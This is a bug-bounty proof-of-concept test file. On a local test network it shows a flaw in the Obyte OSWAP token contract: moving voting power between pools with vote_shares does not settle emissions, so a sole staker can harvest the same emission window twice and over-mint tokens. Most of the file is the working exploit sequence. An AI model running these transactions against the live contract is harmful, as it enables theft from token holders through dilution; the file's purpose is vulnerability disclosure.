/*
 * Immunefi PoC — Obyte / OSWAP token AA
 * "Missing emission settlement before voting-power change in vote_shares leads to
 *  unauthorized OSWAP minting and direct theft of holder funds via dilution"
 *
 * WHAT THIS IS (compliance with Immunefi Web3 PoC rules):
 *  - Runnable code that DEPLOYS THE REAL IN-SCOPE SOURCE (../oswap.oscript + ../oswap-lib.oscript)
 *    into a LOCAL Obyte network via aa-testkit — the Obyte analogue of a Foundry forked-mainnet
 *    test. It is NOT a re-implementation/model and NOT a unit test of a quirk: it executes the
 *    actual attacker transactions against the actual bytecode and prints the funds over-minted.
 *  - Local only. No public testnet/mainnet interaction (Immunefi Web3 Rule).
 *  - Clear per-step console output of supply before/after, scheduled LP emissions, and the
 *    attacker's minted reward from each pool, proving the invariant break Σ received > lp_emissions.
 *
 * HOW TO RUN (see poc/README.md for the full, copy-paste setup):
 *   1) git clone https://github.com/byteball/oswap-token-aa && cd oswap-token-aa
 *   2) place this file in ./test/overmint.test.oscript.js
 *   3) nvm use 16   &&   yarn        (installs aa-testkit + ocore; needs a full toolchain)
 *   4) npx mocha --opts test/mocha.opts test/overmint.test.oscript.js
 *
 * EXPECTED RESULT (assertions + printout):
 *   the attacker (sole staker + sole LP of two pools) collects LP rewards from BOTH pools for the
 *   same emission window — pool1 legitimately, pool2 for a window during which pool2 held 0 voting
 *   power — so total OSWAP minted to the attacker (R1 + R2) exceeds the scheduled LP emission for
 *   that window (~2x), i.e. Σ received_emissions > lp_emissions.
 *
 * NOTE: authored to match the repository's own test conventions (test/oswap.test.oscript.js).
 * The submitting whitehat must run it locally and confirm the assertions pass before submitting
 * (Immunefi: "do not submit a partial or incomplete PoC"). aa-testkit could not be executed in the
 * authoring environment; the deploy/trigger shapes are copied verbatim from the repo's passing tests.
 */

const { promisify } = require('util')
const path = require('path')
const fs = require('fs')
const objectHash = require('ocore/object_hash.js')
const parseOjson = require('ocore/formula/parse_ojson').parse

async function getAaAddress (aa_src) {
	return objectHash.getChash160(await promisify(parseOjson)(aa_src))
}

describe('OSWAP over-mint via vote_shares without emission settlement', function () {
	this.timeout(120 * 1000)

	before(async () => {
		this.common_ts = 1657843200 // 2022-07-15, same anchor the repo tests use

		// compute the library / sale-pool addresses and inject them into the main AA source, exactly
		// as test/oswap.test.oscript.js does, so we deploy the REAL in-scope oswap.oscript unmodified in logic.
		const lib = fs.readFileSync(path.join(__dirname, '../oswap-lib.oscript'), 'utf8')
		const lib_address = await getAaAddress(lib)
		const sale_pool_src = fs.readFileSync(path.join(__dirname, '../initial-sale-pool.oscript'), 'utf8')
		const sale_pool_address = await getAaAddress(sale_pool_src)
		let oswap_aa = fs.readFileSync(path.join(__dirname, '../oswap.oscript'), 'utf8')
		oswap_aa = oswap_aa.replace(/\$lib_aa = '\w{32}'/, `$lib_aa = '${lib_address}'`)
		oswap_aa = oswap_aa.replace(/\$initial_sale_pool_base_aa = '\w{32}'/, `$initial_sale_pool_base_aa = '${sale_pool_address}'`)

		this.network = await Network.create()
			.with.numberOfWitnesses(1)
			.with.asset({ pool1: {} })
			.with.asset({ pool2: {} })
			.with.agent({ oswap_lib: path.join(__dirname, '../oswap-lib.oscript') })
			.with.agent({ sale_pool_base: path.join(__dirname, '../initial-sale-pool.oscript') })
			.with.agent({ deposit: path.join(__dirname, 'deposit.oscript') })
			.with.wallet({ oracle: { base: 1e9 } })
			.with.wallet({ attacker: { base: 1000e9, pool1: 1000e9, pool2: 1000e9 } })
			.with.wallet({ definer: { base: 1000e9 } })
			.run()

		this.pool1 = this.network.asset.pool1
		this.pool2 = this.network.asset.pool2
		this.oracle = this.network.wallet.oracle
		this.oracleAddress = await this.oracle.getAddress()
		this.attacker = this.network.wallet.attacker
		this.attackerAddress = await this.attacker.getAddress()
		this.definer = this.network.wallet.definer

		oswap_aa = oswap_aa.replace('KMCA3VLWKLO3AWSSDA3LQIKI3OQEN7TV', this.oracleAddress) // oracle param

		// The in-scope source hardcodes the initial-sale launch_date to '2023-04-06' (oswap.oscript:213).
		// aa-testkit's clock is real-now and cannot travel to the past, so that 2023 sale window is closed
		// and the bootstrap can't run. Retarget the launch to ~30 days ahead — a harness-only change to a
		// date literal that does NOT touch the vulnerable emission/vote_shares logic (the repo itself does
		// similar string substitutions above for $lib_aa / $initial_sale_pool_base_aa).
		const _pad = (n) => String(n).padStart(2, '0')
		const _d = new Date(Date.now() + 30 * 24 * 3600 * 1000)
		this.launch_date = `${_d.getUTCFullYear()}-${_pad(_d.getUTCMonth() + 1)}-${_pad(_d.getUTCDate())} ${_pad(_d.getUTCHours())}:${_pad(_d.getUTCMinutes())}:${_pad(_d.getUTCSeconds())}`
		oswap_aa = oswap_aa.replace("'2023-04-06 04:34:00'", `'${this.launch_date}'`)

		const { address, error } = await this.definer.deployAgent(oswap_aa)
		expect(error).to.be.null
		this.oswap_aa = address

		this.readState = async () => (await this.attacker.readAAStateVars(this.oswap_aa)).vars
		this.get_lp_reward = async (pool_asset) => {
			const { result } = await this.attacker.executeGetter({ aaAddress: this.oswap_aa, getter: 'get_lp_reward', args: [this.attackerAddress, pool_asset, false] })
			return Number(result)
		}
	})

	it('setup: oracle TVL, token definition, whitelist pool1', async () => {
		await this.oracle.sendMulti({ messages: [{ app: 'data_feed', payload: { TVL: 0.5e6 } }] })
		await this.network.witnessUntilStable()

		await this.network.timefreeze()
		const { unit } = await this.definer.triggerAaWithData({ toAddress: this.oswap_aa, amount: 10000, data: { define: 1 } })
		const { response } = await this.network.getAaResponseToUnitOnNode(this.definer, unit)
		expect(response.bounced).to.be.false
		this.asset = response.response.responseVars.asset                                   // OSWAP asset id
		this.sale_pool_address = response.response.responseVars.initial_sale_pool_address

		// pool1 can be whitelisted with no vote (first pool)
		const { unit: u2 } = await this.definer.triggerAaWithData({ toAddress: this.oswap_aa, amount: 10000, data: { vote_whitelist: 1, pool_asset: this.pool1 } })
		const { response: r2 } = await this.network.getAaResponseToUnitOnNode(this.definer, u2)
		expect(r2.response.responseVars.message).to.be.eq('whitelisted')                     // pool1 -> asset_key a1, group g1
	})

	it('setup: attacker acquires OSWAP via the initial sale and stakes it (VP 100% on pool1/a1)', async () => {
		// contribute reserve to the initial sale (deposit window is open: sim time < launch_date - 1d)
		const { unit: uc } = await this.attacker.sendMulti({ outputs_by_asset: { base: [{ address: this.sale_pool_address, amount: 100e9 + 1000 }] } })
		const { response: rc } = await this.network.getAaResponseToUnitOnNode(this.attacker, uc)
		if (rc.response.error) console.log('contribute error:', rc.response.error)
		expect(rc.bounced).to.be.false
		expect(rc.response.responseVars.added).to.be.eq(100e9)

		// jump forward PAST the retargeted launch date, then trigger the buy (sends contributions to the curve => mints supply)
		await this.network.timetravel({ shift: '40d' })
		const { unit: ub } = await this.attacker.triggerAaWithData({ toAddress: this.sale_pool_address, amount: 10000, data: { buy: 1 } })
		const { response: rb } = await this.network.getAaResponseToUnitOnNode(this.attacker, ub)
		if (rb.response.error) console.log('buy error:', rb.response.error)
		expect(rb.response.responseVars.message).to.be.eq('bought')

		// stake the purchased OSWAP for the max term, voting 100% to pool1 (a1)
		const { unit: us } = await this.attacker.triggerAaWithData({ toAddress: this.sale_pool_address, amount: 10000, data: { stake: 1, group_key: 'g1', percentages: { a1: 100 } } })
		const { response: rs } = await this.network.getAaResponseToUnitOnNode(this.attacker, us)
		if (rs.response.error) console.log('stake error:', rs.response.error)
		expect(rs.bounced).to.be.false

		const vars = await this.readState()
		this.attacker_vp = vars['user_' + this.attackerAddress].normalized_vp
		expect(this.attacker_vp).to.be.greaterThan(0)
		// attacker is the ONLY staker => vp share f = 1 (worst case, makes the 2x over-mint unambiguous)
		expect(vars.state.total_normalized_vp).to.be.closeTo(this.attacker_vp, this.attacker_vp * 1e-9)
	})

	it('setup: attacker whitelists pool2 (a2) and becomes the sole LP of pool1 and pool2', async () => {
		// as a staker with the absolute majority of VP, the attacker whitelists pool2 in one tx
		const { unit: uw } = await this.attacker.triggerAaWithData({ toAddress: this.oswap_aa, amount: 10000, data: { vote_whitelist: 1, pool_asset: this.pool2 } })
		const { response: rw } = await this.network.getAaResponseToUnitOnNode(this.attacker, uw)
		expect(rw.response.responseVars.message).to.be.eq('whitelisted')                     // pool2 -> asset_key a2, group g1

		// deposit LP tokens into both pools => sole LP of each. Must be sent via sendMulti with the pool
		// asset + a base bounce fee + a `data` message (the exact pattern the repo's own tests use).
		const depositPool = async (poolAsset, assetKey) => {
			const { unit, error } = await this.attacker.sendMulti({
				outputs_by_asset: {
					[poolAsset]: [{ address: this.oswap_aa, amount: 100e9 }],
					base: [{ address: this.oswap_aa, amount: 1e4 }],
				},
				messages: [{ app: 'data', payload: { deposit: 1 } }],
				spend_unconfirmed: 'all',
			})
			expect(error).to.be.null
			const { response } = await this.network.getAaResponseToUnitOnNode(this.attacker, unit)
			if (response.response.error) console.log('deposit error:', response.response.error)
			expect(response.bounced).to.be.false
			const st = await this.readState()
			const lp = st['lp_' + this.attackerAddress + '_' + assetKey]
			console.log('deposited into', assetKey, '-> lp.balance:', lp && lp.balance)
			expect(lp.balance).to.be.eq(100e9)   // attacker is the sole LP of this pool
		}
		await depositPool(this.pool1, 'a1')
		await depositPool(this.pool2, 'a2')

		const vars = await this.readState()
		this.supply_before = vars.state.supply
		this.lp_emissions_before = vars.state.lp_emissions
		console.log('\n=== baseline ===')
		console.log('supply                :', this.supply_before)
		console.log('lp_emissions (cum.)   :', this.lp_emissions_before)
		expect(vars['pool_' + this.pool1].received_emissions).to.eq(0)
		expect(vars['pool_' + this.pool2].received_emissions).to.eq(0)
	})

	it('EXPLOIT: harvest pool1 (legit), move VP pool1->pool2 without settling, harvest pool2 (stolen)', async () => {
		const pre = await this.readState()
		console.log('\n=== pre-travel diagnostics ===')
		console.log('total_normalized_vp :', pre.state.total_normalized_vp)
		console.log('supply              :', pre.state.supply)
		console.log('last_emissions_ts   :', pre.state.last_emissions_ts)
		console.log('lp_emissions        :', pre.state.lp_emissions)

		// let one emission window accrue while VP sits entirely on pool1 and neither pool is touched
		const tt = await this.network.timetravel({ shift: '180d' })
		console.log('timetravel -> error:', tt.error, ' timestamp:', tt.timestamp)
		expect(tt.error).to.be.null
		await this.network.witnessUntilStable()  // advance the DAG so the AA sees the traveled time

		// (1) harvest pool1 — LEGITIMATE: pool1 held the attacker's full VP for the whole window
		const R1 = await this.get_lp_reward(this.pool1)
		const { unit: uh1 } = await this.attacker.triggerAaWithData({ toAddress: this.oswap_aa, amount: 10000, data: { pool_asset: this.pool1, withdraw_lp_reward: 1 } })
		const { response: rh1 } = await this.network.getAaResponseToUnitOnNode(this.attacker, uh1)
		if (rh1.response.error) console.log('harvest1 error:', rh1.response.error)
		const afterH1 = await this.readState()
		console.log('after harvest1 -> lp_emissions:', afterH1.state.lp_emissions, ' getter R1:', R1, ' bounced:', rh1.bounced)

		// (2) move ALL voting power pool1 -> pool2 via vote_shares. THIS PATH DOES NOT SETTLE EMISSIONS.
		const vp_on_a1 = (await this.readState())['votes_' + this.attackerAddress].a1
		console.log('moving VP a1 -> a2:', vp_on_a1)
		const { unit: uv } = await this.attacker.triggerAaWithData({ toAddress: this.oswap_aa, amount: 10000, data: { vote_shares: 1, group_key1: 'g1', changes: { a1: -vp_on_a1, a2: vp_on_a1 } } })
		const { response: rv } = await this.network.getAaResponseToUnitOnNode(this.attacker, uv)
		if (rv.response.error) console.log('vote_shares error:', rv.response.error)

		// (3) harvest pool2 — STOLEN: pool2 held 0 VP during the window, but now claims the whole window at full share
		const R2 = await this.get_lp_reward(this.pool2)
		const { unit: uh2 } = await this.attacker.triggerAaWithData({ toAddress: this.oswap_aa, amount: 10000, data: { pool_asset: this.pool2, withdraw_lp_reward: 1 } })
		const { response: rh2 } = await this.network.getAaResponseToUnitOnNode(this.attacker, uh2)
		if (rh2.response.error) console.log('harvest2 error:', rh2.response.error)

		const vars = await this.readState()
		const windowLpEmission = vars.state.lp_emissions - this.lp_emissions_before  // E: scheduled LP emission for the window
		const minted = R1 + R2                                                       // total OSWAP the attacker can claim

		console.log('\n=== exploit result ===')
		console.log('scheduled LP emission for window (E) :', windowLpEmission)
		console.log('R1 pool1 reward (legit)              :', R1)
		console.log('R2 pool2 reward (STOLEN)             :', R2)
		console.log('total minted to attacker (R1+R2)     :', minted)
		console.log('over-mint (minted - E)               :', minted - windowLpEmission)
		console.log('over-mint ratio                      :', (minted / windowLpEmission).toFixed(2) + 'x')
		console.log('supply after                         :', vars.state.supply, '(was', this.supply_before + ')')

		// PROOF OF IMPACT:
		// pool2 stole ~the same amount pool1 legitimately earned...
		expect(R2).to.be.closeTo(R1, Math.max(R1 * 0.02, 1))
		// ...so total minted exceeds the scheduled LP emission for the window (Σ received_emissions > lp_emissions).
		expect(minted).to.be.greaterThan(windowLpEmission * 1.5)
	})
})
